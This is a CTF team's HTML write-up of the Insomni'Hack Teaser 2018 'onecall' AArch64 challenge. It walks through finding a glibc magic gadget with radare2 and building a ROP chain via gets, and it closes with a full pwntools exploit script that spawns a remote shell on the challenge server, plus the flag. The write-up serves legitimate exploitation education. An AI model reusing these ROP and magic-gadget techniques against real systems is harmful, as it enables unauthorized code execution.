<!DOCTYPE html>
<html lang="en-US">
		<head>
				<meta charset="UTF-8">

				<!-- Begin Jekyll SEO tag v2.5.0 -->
<title>onecall - Insomni’Hack Teaser 2018 | Ntropy - UNC</title>
<meta name="generator" content="Jekyll v3.8.5" />
<meta property="og:title" content="onecall - Insomni’Hack Teaser 2018" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="onecall" />
<meta property="og:description" content="onecall" />
<link rel="canonical" href="http://localhost:4000/exploit/pwn/gets/rop/aarch64/arm/magic/gadget/writeup/post/2018/01/21/OneCall.html" />
<meta property="og:url" content="http://localhost:4000/exploit/pwn/gets/rop/aarch64/arm/magic/gadget/writeup/post/2018/01/21/OneCall.html" />
<meta property="og:site_name" content="Ntropy - UNC" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2018-01-21T19:08:00-05:00" />
<script type="application/ld+json">
{"headline":"onecall - Insomni’Hack Teaser 2018","dateModified":"2018-01-21T19:08:00-05:00","datePublished":"2018-01-21T19:08:00-05:00","url":"http://localhost:4000/exploit/pwn/gets/rop/aarch64/arm/magic/gadget/writeup/post/2018/01/21/OneCall.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/exploit/pwn/gets/rop/aarch64/arm/magic/gadget/writeup/post/2018/01/21/OneCall.html"},"description":"onecall","@type":"BlogPosting","@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->

				<meta name="description" content="The official website for ntropy, UNC Chapel Hill CTF Team"/>
				<meta name="viewport" content="width=device-width, initial-scale=1">
				<meta name="theme-color" content="#157878">
				<link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
				<link rel="stylesheet" href="/assets/css/style.css?v=a7c14c29bf6f657c90f53aa4342eb47011c20fd7">


				<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css"></link>
				<script src="https://code.jquery.com/jquery-1.10.2.js"></script>
		</head>
		<body>
				<div class="container-fluid">
						<div class="row">
								<div class="col"></div>
								<div class="col-8" id="main_col">

								<!-- Navigation -->
								<nav class="navbar navbar-expand-sm bg-dark navbar-dark">
										<a class="navbar-brand" href="https://ntropy-unc.github.io/">
												<img class="logo" alt= "logo" src="/img/logo.svg"></img>
										</a>
										<ul class="navbar-nav mr-auto">
												<li class="nav-item">
														<a class="nav-link" href="/about/">About</a>
												</li>

												<li class="nav-item">
														<a class="nav-link" href="/writeups/">Write Ups</a>
												</li>
												<li class="nav-item">
														<a class="nav-link" href="/events/">Events</a>
												</li>
												<li class="nav-item">
														<a class="nav-link" href="/resources/">Resources</a>
												</li>
										</ul>
								</nav>

				<section class="main-content">
						<h1 id="onecall">onecall</h1>

<blockquote>
  <p>Damnit, I tried that gem and it didn’t work… Can you get a shell for me ?
Difficulty: Easy-ish</p>
</blockquote>

<p>The challlenge comes in an archive containing the target Aarch64 ELF binary, the necessary libc
and ld binaries to link with, a copy of <code class="highlighter-rouge">qemu-aarch64</code> to run locally, and a script
to demonstrate how it’s ran.</p>

<p>You can get my copy of the archive from 
<a href="https://github.com/n00bSec/CTF-archive/blob/master/InsomnihackTeaser2018/onecall-chall/onecall-efe64fb18c06fbc4ce1c2ae4e7679e14c19ac293d04bdbd13b7d6babe49728b8.tgz">here</a>.</p>

<p>If you follow along with the same familiarity I had, I suggest using the -g flag in
<code class="highlighter-rouge">qemu-aarch64</code> to allow you to attach <code class="highlighter-rouge">gdb-multiarch</code> for debugging.</p>

<h2 id="what-are-magic-gadgets">What Are Magic Gadgets?</h2>
<p>The premise of the challenges’ title is that with a single function call, you’re supposed to be
able to get a shell. The <code class="highlighter-rouge">gem</code> mentioned is likely 
<a href="https://github.com/david942j/one_gadget">one_gadget</a>, a tool written in Ruby to cough
up a “magic gadget” for a given libc. These magic gadgets are a huge help if you can control
the program counter after leaking the position of libc, because without any other
setup you essentially land on one and immediately have a shell. Neat, isn’t it?</p>

<p>The tool and all others I’ve seen like it had been written with x86/x64 in mind however, 
which sadly doesn’t translate into the same effectiveness in the ARM/Aarch64 architectures,
where registers are loaded with arguments differently.
So that means to do this challenge, you’d have to find your own magic gadget manually.
Thankfully, the basic idea 
<a href="https://0xabe.io/howto/exploit/2016/03/30/Radare2-of-the-Lost-Magic-Gadget.html">covered here</a> 
is largely the same still, since it’s still glibc you’re abusing.</p>

<h2 id="some-notes-on-aarch64">Some Notes On Aarch64</h2>
<p>This challenge served as a reason for me to actually read some of the 
<a href="https://goo.gl/eBT4w7">ARMv8 manual</a>,
just so I could understand a portion of what I was reading in the disassembly.
I also took the time to read some articles and 
<a href="https://www.youtube.com/watch?v=tBHHBEWu2wI">watch a video</a> 
mentioning some of the changes
made between the good ol’ 32-bit ARM I was used to and the newer Aarch64. In all, a lot of
changes were made to the architecture. I had come to miss plenty of features
in the older architecture, like instructions
that’d operate on an arbitrary number of registers, 
straightforward PUSH/POP instructions that’d do the same,
writing directly into the program counter, and 16-bit Thumb-mode.</p>

<p>Instead of functions ending with a POP instruction that moves several pieces of data off of the
stack and into the registers, you’ll likely only ever see registers loaded in pairs
on the newer ARM. Storing registers in pairs isn’t uncommon either, and neither is
separating the loading of variables’ higher order base addresses and their lower order offsets
(though I suspect there might be a specific architectural reason for this).</p>

<p>Also without a Thumb mode, you can’t double your possibilities for instructions and 
ROP gadgets for free by branching into an alternate instruction set. 
ALL instructions are aligned 32-bit,
and a fault gets raised anytime the program counter isn’t following said alignment.</p>

<p>But although the challenge is made somewhat harder, it’s still plenty possible.</p>

<h2 id="initial-analysis">Initial Analysis</h2>
<p>I used Radare2 for all of my disassembly during the CTF.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r2 <span class="nt">-A</span> onecall
VV
s main
</code></pre></div></div>
<p><img src="/pics/Insomnihack/main.png" alt="Main procedure" /></p>

<p>The target binary itself is fairly simple. First, it reads out its own <code class="highlighter-rouge">/proc/self/maps</code>
file, showing all of the binaries mapped into its process, as well as their addresses.
Most of the file is then written to standard output where we can read it,
before we give 8 bytes to <code class="highlighter-rouge">read()</code> for the program counter to branch to through the <code class="highlighter-rouge">x1</code> register.</p>

<p><img src="/pics/Insomnihack/jumpx1.png" alt="Branching from x1" /></p>

<p>With most of the mappings available, and immediate control of the program counter,
we can then look for the magic gadget for the given libc, and try to get our shell.</p>

<h2 id="finding-the-magic-gadget">Finding the Magic Gadget</h2>
<p>The last magic gadget I had used in glibc game from a specific part of <code class="highlighter-rouge">system</code>.
The lines of source that read…</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define SHELL_PATH      "/bin/sh"       </span><span class="cm">/* Path of the shell.  */</span><span class="cp">
</span><span class="p">...</span>
<span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">__execve</span> <span class="p">(</span><span class="n">SHELL_PATH</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="o">*</span><span class="p">)</span> <span class="n">new_argv</span><span class="p">,</span> <span class="n">__environ</span><span class="p">);</span> <span class="c1">//&lt;-- Look in do_system()
</span></code></pre></div></div>
<p>By returning right into where the argument setup and call occurs for this line of code, we ought
to manage getting our shell. To find it, you can first find <code class="highlighter-rouge">"/bin/sh"</code>, and then find
where it’s referenced in <code class="highlighter-rouge">__libc_system</code>.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r2 -A lib/libc.so.6 #This can take a second.
/ /bin/sh
#Observe the base offset of 0x117000
#And then you can look through all of the calls to execve in __libc_system. I got one.
axt sym.execve ~__libc_system
</code></pre></div></div>

<p><img src="/pics/Insomnihack/magicgadget.png" alt="Here lies the magic gadget." /></p>

<p>You probably won’t get a direct hit in searching for xrefs to the string 
(perhaps because of how the architecture has to do its referencing now)
but the match still isn’t too hard to find by glancing between the source
and the disassembly.</p>

<p>Notice though the store operation that happens right before loading <code class="highlighter-rouge">x2</code> in our
lovely gadget. During actual execution,
this <code class="highlighter-rouge">x20</code> register gets set somewhere I wasn’t able to track down, 
but it needs to be set somewhere
safe before the execution can continue.</p>

<h2 id="workaround">Workaround</h2>

<p>It took me a long time to figure the right workaround was to return into <code class="highlighter-rouge">gets</code> while the
<code class="highlighter-rouge">x0</code> register still points to the stack. Then you can write onto the stack all of the
necessary data pointers and return addresses necessary to do Return Oriented Programming.</p>

<p>I used <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> 
to come across the gadget I used to move <code class="highlighter-rouge">x20</code> in my exploit, and found that
although the stack wasn’t leaked directly by the <code class="highlighter-rouge">/proc/self/maps</code> read, the very last line of
output does have a consistent offset from the stack you get to see in GDB. This I felt was much
better than pointing into libc’s data section, or any other writable mapping I took notice of.</p>

<h2 id="the-exploit">The Exploit</h2>

<p>I shifted <code class="highlighter-rouge">x20</code> to a safe stack address used in the original program, and jumped into the
magic gadget so that I could enjoy the shell. The slightly cleaned up exploit follows.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">DEBUG</span> <span class="o">=</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">getpipe</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span> <span class="c">#Attach debugger.</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="s">'./qemu-aarch64'</span><span class="p">,</span> <span class="s">'-nx'</span><span class="p">,</span> <span class="s">'-L'</span><span class="p">,</span> <span class="s">'./'</span><span class="p">,</span> <span class="s">'-g'</span><span class="p">,</span> <span class="s">'12345'</span><span class="p">,</span> <span class="s">'./onecall'</span><span class="p">])</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s">'onecall.teaser.insomnihack.ch'</span><span class="p">,</span><span class="mi">1337</span><span class="p">)</span>

<span class="n">libc_name</span> <span class="o">=</span> <span class="s">"./lib/libc.so.6"</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_name</span><span class="p">)</span>

<span class="n">gets</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'gets'</span><span class="p">]</span>

<span class="n">magic_gadget_offset</span> <span class="o">=</span> <span class="mh">0x3d718</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">getpipe</span><span class="p">()</span>

<span class="n">output</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">line</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">output</span> <span class="o">+=</span> <span class="n">line</span>
<span class="k">while</span> <span class="s">"libc"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
    <span class="n">line</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="n">output</span> <span class="o">+=</span> <span class="n">line</span>
<span class="n">output</span> <span class="o">+=</span> <span class="n">line</span>
<span class="n">output</span> <span class="o">+=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" here ?"</span><span class="p">)</span>

<span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'-'</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>

<span class="c">#Initialize ROP</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">gets</span><span class="p">))</span>

<span class="c">#For GDB</span>
<span class="k">print</span> <span class="s">"Gets returns @"</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x000604c8</span><span class="p">)</span> 

<span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1179a0</span>

<span class="c">#0x0003d7f0      f353c3a8       ldp x19, x20, [sp], 0x30; ret</span>
<span class="c">#What does this do? I took a guess, and tried it.</span>
<span class="n">loadtox20</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x3d7f0</span>

<span class="c">#For GDB</span>
<span class="k">print</span> <span class="s">"Loading gadget @"</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">loadtox20</span><span class="p">)</span>

<span class="c">#last region in /proc/self/maps</span>
<span class="c">#00007f38241b9000</span>
<span class="c">#$sp after blr x1 in same run</span>
<span class="c">#00007f38249b8630</span>

<span class="n">memaddr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">output</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'-'</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="c">#Consistent offset of 0x7ff630? Yep.</span>
<span class="n">stkbase</span> <span class="o">=</span> <span class="n">memaddr</span> <span class="o">+</span> <span class="mh">0x7ff630</span> <span class="c">#Here should be a pointer to the filler in our stack.</span>
<span class="n">saferw</span> <span class="o">=</span> <span class="n">stkbase</span>

<span class="c">#Build rop chain. Don't need precision when you can just spray.</span>
<span class="n">ropchain</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
    <span class="n">loadtox20</span><span class="o">-</span><span class="mi">4</span><span class="p">,</span> <span class="c">#Trying to move x20 to point to stack, load [sp, #16] into x30 for ret</span>
    <span class="n">libc_base</span> <span class="o">+</span> <span class="n">magic_gadget_offset</span><span class="p">,</span>
    <span class="n">saferw</span><span class="p">,</span> <span class="c">#For pivoting x20 somewhere safe, throw it up real high</span>
    <span class="n">libc_base</span><span class="o">+</span><span class="n">magic_gadget_offset</span><span class="p">,</span> 
    <span class="n">saferw</span><span class="p">,</span> <span class="n">saferw</span><span class="p">,</span> <span class="n">saferw</span><span class="p">,</span> 
    <span class="n">saferw</span><span class="p">,</span><span class="n">saferw</span><span class="p">,</span> <span class="n">saferw</span><span class="p">,</span> <span class="n">saferw</span><span class="p">,</span> <span class="n">saferw</span><span class="p">,</span><span class="n">saferw</span><span class="p">,</span> <span class="n">saferw</span><span class="p">,</span> <span class="n">saferw</span><span class="p">,</span> <span class="n">saferw</span>
    <span class="p">],</span> <span class="n">word_size</span><span class="o">=</span><span class="mi">64</span><span class="p">)</span>


<span class="n">payload</span> <span class="o">=</span> <span class="s">"AAAAAAAA"</span><span class="o">*</span><span class="mi">2</span> <span class="c">#Filler</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">ropchain</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="c">#INS{did_you_gets_here_by_chance?}</span>
</code></pre></div></div>


						<footer id="site-footer">
								<a href="https://github.com/ntropy-unc/ntropy-unc.github.io">ntropy-unc.github.io</a> is maintained by <a href="https://github.com/ntropy-unc">ntropy-unc</a>. 
								|  Contact : unc@dc919.net 
						</footer>
				</section>

						
								</div>
								<div class="col"></div>
						</div>
				</div>
		</body>
</html>
